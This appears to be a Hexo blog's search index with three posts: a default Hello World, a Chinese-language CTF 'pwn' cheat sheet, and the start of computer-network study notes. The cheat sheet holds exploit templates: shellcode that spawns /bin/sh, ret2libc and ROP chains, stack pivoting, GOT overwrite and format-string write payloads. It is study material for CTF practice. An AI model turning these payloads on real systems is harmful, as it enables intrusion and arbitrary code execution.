<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/2022/09/29/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>pwn</title>
    <url>/2022/09/30/pwn/</url>
    <content><![CDATA[<h1 id="PWN题目总结"><a href="#PWN题目总结" class="headerlink" title="PWN题目总结"></a>PWN题目总结</h1><h2 id="PWNTOOLS"><a href="#PWNTOOLS" class="headerlink" title="PWNTOOLS"></a>PWNTOOLS</h2><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, os=<span class="string">&#x27;Linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#32位为i386，64位为amd64</span></span><br><span class="line">p=process(<span class="string">&#x27;./filename&#x27;</span>)<span class="comment">#打本地</span></span><br><span class="line">p=remote(<span class="string">&#x27;192.168.1.103&#x27;</span>,<span class="number">10001</span>)<span class="comment">#打远程</span></span><br><span class="line">p.close()  <span class="comment">#关闭</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#连接gdb</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">sleep(<span class="number">1</span>)<span class="comment">#防止gdb还没连接就执行到后面了</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">hex</span>() 将十进制转化成<span class="number">16</span>进制</span><br><span class="line"><span class="comment">#发送 payload</span></span><br><span class="line">p32()\p64()\u32()\u64()<span class="comment">#发送数据前需要p32或p64、</span></span><br><span class="line">cyclic(<span class="number">100</span>)<span class="comment">#生成100个填充字符</span></span><br><span class="line">p.send(payload)   发送 payload</span><br><span class="line">p.sendline(payload)   发送 payload，并进行换行（末尾\n）</span><br><span class="line">p.sendafter(some_string, payload)   接收到 some_string 后, 发送你的 payload</span><br><span class="line">p.sendlineafter(some_string, payload)   接收到 some_string 后, 发送你的 payload，加个换行</span><br><span class="line"></span><br><span class="line"><span class="comment">#接收返回内容</span></span><br><span class="line">p.recv(N)   接受 N(数字) 字符</span><br><span class="line">p.recvline()  接收一行输出</span><br><span class="line">p.recvlines(N)   接收 N(数字) 行输出</span><br><span class="line">p.recvuntil(some_string)   接收到 some_string 为止</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;AAA&#x27;</span>,drop=<span class="number">1</span>/<span class="number">0</span>)	接收到<span class="string">&#x27;AAA&#x27;</span>为止，<span class="number">1</span>代表不保留<span class="number">3</span>个<span class="string">&#x27;A&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#生成 shellcode</span></span><br><span class="line">asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.interactive()    直接进行交互，相当于回到shell的模式，一般在取得shell之后使用</span><br></pre></td></tr></table></figure>

<h3 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">首先需要 elf=ELF(<span class="string">&#x27;./filename&#x27;</span>) 来产生一个对象</span><br><span class="line">elf.symbols[<span class="string">&#x27;a_function&#x27;</span>]  找到标识符 a_function 的地址</span><br><span class="line">elf.got[<span class="string">&#x27;a_function&#x27;</span>]  找到函数 a_function的 got</span><br><span class="line">elf.plt[<span class="string">&#x27;a_function&#x27;</span>]  找到函数 a_function 的 plt</span><br><span class="line">elf.<span class="built_in">next</span>(e.search(<span class="string">&quot;some_characters&quot;</span>))  找到包含 some_characters 可以是字符串，汇编代码或者某个数值的地址</span><br></pre></td></tr></table></figure>

<h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop = ROP(<span class="string">&#x27;./filename&#x27;</span>) 还是要先创建一个对象</span><br><span class="line">rop.raw(<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)   在构造的 rop 链里面写 <span class="number">32</span> 个 a</span><br><span class="line">rop.call(<span class="string">&#x27;read&#x27;</span>, (<span class="number">0</span>, elf.bss(<span class="number">0x80</span>)))  调用一个函数，可以简写成：rop.read(<span class="number">0</span>, elf.bss(<span class="number">0x80</span>))</span><br><span class="line">rop.chain()   就是整个 rop 链，发送的 payload</span><br><span class="line">rop.dump()  直观地展示当前的 rop 链</span><br><span class="line">rop.migrate(base_stage)   将程序流程转移到 base_stage（地址）</span><br><span class="line">rop.unresolve(value)  给出一个地址，反解析出符号</span><br><span class="line">rop.search(regs=[<span class="string">&#x27;ecx&#x27;</span>,<span class="string">&#x27;ebx&#x27;</span>])   搜索对 eax 进行操作的 gadgets</span><br><span class="line">rop.find_gadget([<span class="string">&#x27;pop eax&#x27;</span>,<span class="string">&#x27;ret&#x27;</span>])   搜索 pop eax ret 这样的 gadgets</span><br></pre></td></tr></table></figure>

<h3 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#没有libc文件</span></span><br><span class="line">puts_addr = <span class="built_in">int</span>(p.recvline()[<span class="number">14</span>,-<span class="number">2</span>])<span class="comment">#输出的第14个字符到倒数第二个字符</span></span><br><span class="line"><span class="comment">#puts_addr = int(p.recvline()[14,-2]，16) 泄露的是16进制的地址</span></span><br><span class="line">puts_addr 为我们泄露出的值</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">libc.dump(<span class="string">&#x27;__libc_start_main_ret&#x27;</span>)</span><br><span class="line"><span class="comment">#有libc文件</span></span><br><span class="line">libc=ELF(<span class="string">&quot;./Libc文件&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base +libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;sh\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#elf.search(b&quot;sh\x00&quot;)</span></span><br><span class="line"><span class="built_in">next</span>(elf.search(<span class="string">b&quot;sh\x00&quot;</span>))</span><br></pre></td></tr></table></figure>

<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor 	rsi,	rsi			</span></span><br><span class="line"><span class="string">push	rsi				</span></span><br><span class="line"><span class="string">mov 	rdi,	0x68732f2f6e69622f	 </span></span><br><span class="line"><span class="string">push	rdi</span></span><br><span class="line"><span class="string">push	rsp		</span></span><br><span class="line"><span class="string">pop	rdi				</span></span><br><span class="line"><span class="string">mov 	al,	59			</span></span><br><span class="line"><span class="string">cdq					</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = asm(shellcode)</span><br><span class="line"><span class="comment">#该shellcode长度为22</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload1 = ams(shellcraft.sh())</span><br><span class="line">payload2 = payload . ljust(偏移值+4或+8 , b&#x27;A&#x27;) + p32/64(全局变量_addr) </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shellcode = ams(shellcraft.sh())</span><br><span class="line">payload = shellcode +b&#x27;\x90&#x27; * (偏移值+4/8 - len(shellcode)) + p32/64(返回地址)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = asm(shellcraft.cat(&#x27;flag&#x27;))</span><br><span class="line">payload = payload.ljust(0x38,&#x27;\x00&#x27;)</span><br></pre></td></tr></table></figure>



<h3 id="终端查找"><a href="#终端查找" class="headerlink" title="终端查找"></a>终端查找</h3><p>64位时，六个整型或指针参数依次保存在 <strong>RDI, RSI, RDX, RCX, R8 和 R9 寄存器</strong>中，如果还有更多的参数的话才会保存在栈上。</p>
<p>打远程有时候需要平衡栈，在ROP链的末端 + ret函数</p>
<p>ROPgadget –binary elf文件 –only “pop|ret”	找到text中有pop或ret的地址</p>
<p>ROPgadget –binary elf文件 –only “pop|ret”	| grep eax	含有eax</p>
<p>ROPgadget –binary elf文件 –only “0x80”</p>
<p>终端输入one_gadget libc文件			查看一些one gadget的偏移值</p>
<p>onegadget&#x3D;libcBase + 查看到的偏移值		(一个一个慢慢试)</p>
<p>payload &#x3D; flat(cyclic(偏移值+4&#x2F;8),onegadget)</p>
<p>cd 文件名</p>
<p>strings 文件名 | grep 字符串</p>
<h2 id="栈溢出题目"><a href="#栈溢出题目" class="headerlink" title="栈溢出题目"></a>栈溢出题目</h2><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>payload &#x3D; b’A’ * 偏移量 + b’B’ * 4&#x2F;8 + p64(后门函数地址)</p>
<h3 id="没有后门函数但没有打开NX保护措施shellcode"><a href="#没有后门函数但没有打开NX保护措施shellcode" class="headerlink" title="没有后门函数但没有打开NX保护措施	shellcode"></a>没有后门函数但没有打开NX保护措施	shellcode</h3><p>payload1 &#x3D; asm(shellcraft.sh())</p>
<p>payload2 &#x3D; payload . ljust(偏移值+4或+8 , b’A’) + p32&#x2F;64(返回地址) </p>
<p>或者</p>
<p>shellcode &#x3D; asm(shellcraft.sh())</p>
<p>payload &#x3D; shellcode +b’\x90’ * (偏移值+4&#x2F;8 - len(shellcode)) + p32&#x2F;64(返回地址) 	\x90是空指令	NOP 使程序更稳定</p>
<h3 id="静态链接文件"><a href="#静态链接文件" class="headerlink" title="静态链接文件"></a>静态链接文件</h3><p>静态链接的文件系统调用函数比较多，可以构造出完整实现攻击的ROP链</p>
<p>如</p>
<p>int 0x80		代表进行系统调用</p>
<p>0xb				表示sys_execve()的系统调用号</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pop_eax_ret=该函数地址</span><br><span class="line">pop_edx_ecx_ebx_ret=该函数地址</span><br><span class="line">int_80h=该函数地址</span><br><span class="line">bin_sh=字符串<span class="string">&quot;/bin/sh&quot;</span>的地址</span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span>*偏移值+<span class="number">4</span>/<span class="number">8</span>,pop_eax_ret,<span class="number">0xb</span>,pop_edx_ecx_ebx_ret,<span class="number">0</span>,<span class="number">0</span>,bin_sh,int_80h])</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">112</span>+p32(pop_eax_ret)+p32(<span class="number">0xb</span>)+p32(pop_edx_ecx_ebx_ret)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bin_sh)+p32(int_80h)</span><br></pre></td></tr></table></figure>

<h3 id="动态链接文件有system和”-x2F-bin-x2F-sh”但是分开"><a href="#动态链接文件有system和”-x2F-bin-x2F-sh”但是分开" class="headerlink" title="动态链接文件有system和”&#x2F;bin&#x2F;sh”但是分开"></a>动态链接文件有system和”&#x2F;bin&#x2F;sh”但是分开</h3><ul>
<li>32位</li>
</ul>
<p>payload &#x3D; padding + system_plt + 0xdeadbeef(填充ebp) + bin_sh_addr</p>
<ul>
<li>64位</li>
</ul>
<p>payload &#x3D; padding + pop_rdi_ret + bin_sh_addr + system_plt</p>
<h3 id="只有system没有”-x2F-bin-x2F-sh”"><a href="#只有system没有”-x2F-bin-x2F-sh”" class="headerlink" title="只有system没有”&#x2F;bin&#x2F;sh”"></a>只有system没有”&#x2F;bin&#x2F;sh”</h3><p>这边以read为例，不一定用read，也可以是其他输入函数</p>
<ul>
<li>32位</li>
</ul>
<p>一次性利用链</p>
<p>关于参数一：0是标准输入，1是标准输出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = padding + read_plt + system_plt + 参数一(<span class="number">0</span>) + 变量地址(/<span class="built_in">bin</span>/sh写入地址) + 参数<span class="number">3</span>(写入长度) + 变量地址(/<span class="built_in">bin</span>/sh写入地址)</span><br><span class="line"></span><br><span class="line">ROP利用链</span><br><span class="line"></span><br><span class="line">payload1 = padding + read_plt + main_addr + 参数一(<span class="number">0</span>) + 变量地址(/<span class="built_in">bin</span>/sh写入地址) + 参数<span class="number">3</span>(写入长度)</span><br><span class="line">payload2 = padding + sys_plt + <span class="number">0xdeadbeef</span> + 变量地址(/<span class="built_in">bin</span>/sh写入地址)</span><br></pre></td></tr></table></figure>

<ul>
<li>64位</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pop_rdi都会有单独的gadget，rsi多数以pop_rsi_r15形式出现，rdx少有gadget，这里假设gadget情况如下，实际做题实际调整：</span><br><span class="line"></span><br><span class="line">payload1 = padding + pop_rdi + 参数一(<span class="number">0</span>) + pop_rdi_r15 + binsh写入地址 + <span class="number">0xdeadbeef</span> + pop_rdx + 参数<span class="number">3</span>(写入长度) + read_plt</span><br><span class="line">payload2 = padding + pop_rdi + binsh写入地址 + system_plt</span><br><span class="line"></span><br><span class="line">pop_rdx gadget不一定有。这是可以尝试不传第三个参数，用寄存器rdx的原值，这个值有可能符合需要（若需要控制前三个参数了解一下ret2csu），payload简化如下：</span><br><span class="line"></span><br><span class="line">payload1 = padding + pop_rdi + 参数一(<span class="number">0</span>) + pop_rdi_r15 + binsh写入地址 + <span class="number">0xdeadbeef</span> + read_plt</span><br><span class="line">payload2 = padding + pop_rdi + binsh写入地址 + system_plt</span><br></pre></td></tr></table></figure>

<h3 id="无后门函数ret2libc"><a href="#无后门函数ret2libc" class="headerlink" title="无后门函数ret2libc"></a>无后门函数ret2libc</h3><ul>
<li>32位</li>
</ul>
<p>关于puts函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload1 = padding + puts_plt + main_addr + puts_got</span><br><span class="line">调用puts函数泄露出  puts_addr</span><br><span class="line">libc_base = puts_addr - puts_libc</span><br><span class="line">system_addr = libc_base + sys_libc</span><br><span class="line">binsh_addr = libc_base + binsh_libc</span><br><span class="line">payload2 = padding + system_addr + <span class="number">0xdeadbeef</span> + binsh_addr</span><br></pre></td></tr></table></figure>

<ul>
<li>64位</li>
</ul>
<p>关于puts函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload1= padding + pop_rdi + puts_got + puts_plt + main_addr</span><br><span class="line">puts_addr= <span class="built_in">hex</span>(u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>)))</span><br><span class="line">libc_base = puts_addr - puts_libc</span><br><span class="line">system_addr = libc_base + sys_libc</span><br><span class="line">binsh_addr = libc_base + binsh_libc</span><br><span class="line">payload2= padding + pop_rdi + binsh_addr + system_addr</span><br></pre></td></tr></table></figure>

<h3 id="溢出函数等于偏移值——栈迁移"><a href="#溢出函数等于偏移值——栈迁移" class="headerlink" title="溢出函数等于偏移值——栈迁移"></a>溢出函数等于偏移值——栈迁移</h3><ul>
<li>32位</li>
</ul>
<p>输入内容有两次，都是输入全局变量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload1 = ams(shellcraft.sh())</span><br><span class="line">payload2 = payload . ljust(偏移值+<span class="number">4</span>或+<span class="number">8</span> , <span class="string">b&#x27;A&#x27;</span>) + p32/<span class="number">64</span>(全局变量_addr) </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shellcode = ams(shellcraft.sh())</span><br><span class="line">payload = shellcode +b&#x27;\x90&#x27; * (偏移值+4/8 - len(shellcode)) + p32/64(返回地址)</span><br></pre></td></tr></table></figure>

<p>输入内容有两次，第一次是全局变量，第二次是局部变量</p>
<p>泄露地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*偏移值 + p32(全局变量_addr) + p32(leave_ret)</span><br></pre></td></tr></table></figure>

<p>泄露地址后返回main函数，第二次运行程序。后续getshell可以用onegadget或者system(&#x2F;bin&#x2F;sh)</p>
<p>onegadget需要运气</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload3=[任意内容]</span><br><span class="line">payload4=<span class="string">&#x27;a&#x27;</span>*偏移值 + <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p32(onegadget)</span><br></pre></td></tr></table></figure>

<p>system(&#x2F;bin&#x2F;sh)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload3= <span class="string">&#x27;a&#x27;</span> *<span class="number">4</span>+p32(system_addr)+ p32(main) + p32(binsh_addr)</span><br><span class="line">payload4= <span class="string">&#x27;a&#x27;</span>*偏移值 + p32(全局变量_addr) + p32(leave_ret)</span><br></pre></td></tr></table></figure>

<h3 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h3><p>主要针对调用64位程序的函数需要使用到3个参数，ROPgadget没有</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ret2csu</span>(<span class="params">got,rdi,rsi,rdx,addr</span>):</span><br><span class="line">	rop.raw(<span class="number">0</span>)</span><br><span class="line">	rop.raw(<span class="number">1</span>)</span><br><span class="line">	rop.raw(got) <span class="comment">#要被调用的函数</span></span><br><span class="line">	rop.raw(rdi) <span class="comment">#rdi</span></span><br><span class="line">	rop.raw(rsi) <span class="comment">#rsi</span></span><br><span class="line">	rop.raw(rdx) <span class="comment">#rdx</span></span><br><span class="line">	rop.raw(<span class="number">0x0000000004006C0</span>)<span class="comment">#mov段</span></span><br><span class="line">	rop.raw(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)	<span class="comment">#填充</span></span><br><span class="line">	rop.raw(p64(<span class="number">0</span>)*<span class="number">6</span>)<span class="comment">#填充</span></span><br><span class="line">	rop.raw(addr) <span class="comment">#返回addr</span></span><br><span class="line">    </span><br><span class="line">p.sendline(rop.chain())</span><br></pre></td></tr></table></figure>

<h3 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h3><p>payload &#x3D; padding + p32(s-4) + p32(leave_ret)</p>
<p>32位 -4 ， 64位 -8</p>
<h2 id="覆盖got表攻击"><a href="#覆盖got表攻击" class="headerlink" title="覆盖got表攻击"></a>覆盖got表攻击</h2><p>只要把一个函数got表的值修改成其他函数</p>
<p>比如说把puts函数got表的值修改成system，执行puts就会变成执行system</p>
<h2 id="格式化字符串攻击"><a href="#格式化字符串攻击" class="headerlink" title="格式化字符串攻击"></a>格式化字符串攻击</h2><h3 id="使程序崩溃"><a href="#使程序崩溃" class="headerlink" title="使程序崩溃"></a>使程序崩溃</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%&#x27;</span></span><br></pre></td></tr></table></figure>

<p>只要%s足够多，栈上没有值可以打印，程序就崩溃了</p>
<h3 id="求偏移值"><a href="#求偏移值" class="headerlink" title="求偏移值"></a>求偏移值</h3><ul>
<li>手动：AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p</li>
</ul>
<p>​			看看泄露出来哪一个对应了AAAA(0x41414141)</p>
<ul>
<li><p>gdb数</p>
</li>
<li><p>pwngdb：fmtarg + 栈帧地址</p>
</li>
</ul>
<p>fmtstr_payload是pwntools里面的一个工具，用来简化对格式化字符串漏洞的构造工作</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exec_fmt</span>(<span class="params">payload</span>):</span><br><span class="line">    io = process(<span class="string">&#x27;./fmt2&#x27;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    info = io.recv()</span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line">auto = FmtStr(exec_fmt)</span><br><span class="line">offset = auto.offset</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(offset, &#123;printf_got: system_addr&#125;)</span><br></pre></td></tr></table></figure>



<h3 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p32(addr) + <span class="string">&#x27;%n$x&#x27;</span>	<span class="comment">#addr是覆盖的地址，n是输出格式，x是偏移值</span></span><br><span class="line">payload = p64(addr) + <span class="string">&#x27;%n$x&#x27;</span></span><br></pre></td></tr></table></figure>

<p>​	%n可以为%x、%p、%s</p>
<p>​	利用 %x和%p 来获取对应栈的存储的内存地址，但建议使用 %p，可以不用考虑位数的区别</p>
<p>​	利用 %s 来获取地址所对应的内容，只不过有零截断</p>
<h3 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h3><h4 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h4><p>覆盖4（32位）或8（64位）以下的数字</p>
<p>把 地址 写在后面</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;aa%8$nxx&#x27;</span> + p32(a_addr)</span><br></pre></td></tr></table></figure>

<p>前面两个a说明要填充2</p>
<p>后面两个x是填充字符，让前面的字符数凑满 4 或 8 的倍数</p>
<h4 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h4><p>%n	一下子写入4个字节</p>
<p>%hn	一下子写入2个字节的内容，写入的是双字节</p>
<p>%hhn	一下子写入1个字节的内容，写入的是单字节</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#例如覆盖成0x12345678</span></span><br><span class="line">payload = p32(b_addr)+p32(b_addr+<span class="number">1</span>)+p32(b_addr+<span class="number">2</span>)+p32(b_addr+<span class="number">3</span>)</span><br><span class="line">payload += <span class="string">&#x27;%104x&#x27;</span>+<span class="string">&#x27;%6$hhn&#x27;</span>+<span class="string">&#x27;%222x&#x27;</span>+<span class="string">&#x27;%7$hhn&#x27;</span>+<span class="string">&#x27;%222x&#x27;</span>+<span class="string">&#x27;%8$hhn&#x27;</span>+<span class="string">&#x27;%222x&#x27;</span>+<span class="string">&#x27;%9$hhn&#x27;</span></span><br><span class="line"><span class="number">0x78</span>		地址占了<span class="number">16</span>个字节，填充时应将地址减去第一个数为<span class="number">0x78</span>-<span class="number">0x10</span>=<span class="number">0x68</span> 即<span class="number">104</span></span><br><span class="line"><span class="number">0x56</span>		前面已经填充了<span class="number">0x78</span>个数了，我们不能直接填充<span class="number">0x56</span>，但我们可以填充<span class="number">0x156</span>，存储时只取后面两个，</span><br><span class="line">第二个数为<span class="number">0x156</span> - <span class="number">0x78</span> = <span class="number">0xDE</span> 即<span class="number">222</span></span><br><span class="line"><span class="number">0x34</span>		前面已经填充了<span class="number">0x156</span>个数了，填充<span class="number">0x234</span>，第三个数为<span class="number">0x234</span> - <span class="number">0x156</span> = <span class="number">0xDE</span> 即<span class="number">222</span></span><br><span class="line"><span class="number">0x12</span>		前面已经填充了<span class="number">0x234</span>个数了，填充<span class="number">0x312</span>，第三个数为<span class="number">0x312</span> - <span class="number">0x234</span> = <span class="number">0xDE</span> 即<span class="number">222</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p32(b_addr)+p32(b_addr+<span class="number">1</span>)+p32(b_addr+<span class="number">2</span>)+p32(b_addr+<span class="number">3</span>)</span><br><span class="line">payload += <span class="string">&#x27;%第一个数x%偏移值$hhn&#x27;</span>+<span class="string">&#x27;%第二个数x%偏移值+1$hhn&#x27;</span>+<span class="string">&#x27;%第三个数x%偏移值+2$hhn&#x27;</span>+<span class="string">&#x27;%第四个数x%偏移值+3$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#使用fmtstr</span></span><br><span class="line">payload = fmtstr_payload(offset, &#123;printf_got: system_addr&#125;)</span><br><span class="line">fmtstr_payload(offset, writes, numbwritten=<span class="number">0</span>, write_size=<span class="string">&#x27;byte&#x27;</span>)</span><br><span class="line"><span class="comment">#第一个参数表示格式化字符串的偏移；</span></span><br><span class="line"><span class="comment">#第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成&#123;printfGOT: systemAddress&#125;；</span></span><br><span class="line"><span class="comment">#第三个参数表示已经输出的字符个数，这里没有，为0，采用默认值即可；</span></span><br><span class="line"><span class="comment">#第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。</span></span><br><span class="line"><span class="comment">#fmtstr_payload函数返回的就是payload</span></span><br><span class="line"><span class="comment">#实际上我们常用的形式是fmtstr_payload(offset,&#123;address1:value1&#125;)</span></span><br><span class="line">例如将0804a048处改为<span class="number">0x12345678</span></span><br><span class="line">payload = fmtstr_payload(offset,&#123;<span class="number">0x804a048</span>:<span class="number">0x12345678</span>&#125;)</span><br></pre></td></tr></table></figure>

<p>由于是小端序，先覆盖的是低位数</p>
<h2 id="绕过ALARM函数"><a href="#绕过ALARM函数" class="headerlink" title="绕过ALARM函数"></a>绕过ALARM函数</h2><p>命令行修改法</p>
<p><em># 将程序名为ProgrammName中的alarm替换为isnan</em> </p>
<p>终端输入&gt;  sed -i s&#x2F;alarm&#x2F;isnan&#x2F;g .&#x2F;ProgrammName</p>
<h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><h3 id="UAFuse-after-free"><a href="#UAFuse-after-free" class="headerlink" title="UAF		use_after_free"></a>UAF		use_after_free</h3><p>我们知道可读可写可执行的程序是非常危险的</p>
<p>use_after_free就是让一块chunk既是数据段chunk，又是控制段chunk</p>
<p>数据段chunk，可写</p>
<p>控制段chunk，可执行</p>
<p>数据段chunk + 控制段chunk，可攻击！！！</p>
<p>比如说fastbin attack double free漏洞，即一个chunk被free两次</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/02/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
    <content><![CDATA[<h1 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h1><p>​																						——by s1eepstar</p>
<h2 id="计算机网络概述"><a href="#计算机网络概述" class="headerlink" title="计算机网络概述"></a>计算机网络概述</h2><p>计算机网络的基本功能是 资源共享 和 数据通信</p>
<p>计算机网络是计算机技术和 通信技术  相结合的产物</p>
<p>计算机网络系统由负责 信息传递 的通信子网和负责信息处理的 资源 子网组成</p>
<img src="C:\Users\Star\AppData\Roaming\Typora\typora-user-images\image-20230218180731288.png" alt="image-20230218180731288" style="zoom: 33%;" />

<p>Internet分成两个部分：边缘部分和核心部分。</p>
<p>计算机内传输的信号是 数字信号 ，而公用电话系统的传输系统只能传输 模拟信号 </p>
<p>常用的交换技术主要有电路交换和分组交换。</p>
<img src="C:\Users\Star\AppData\Roaming\Typora\typora-user-images\image-20230218181153169.png" alt="image-20230218181153169" style="zoom: 33%;" />

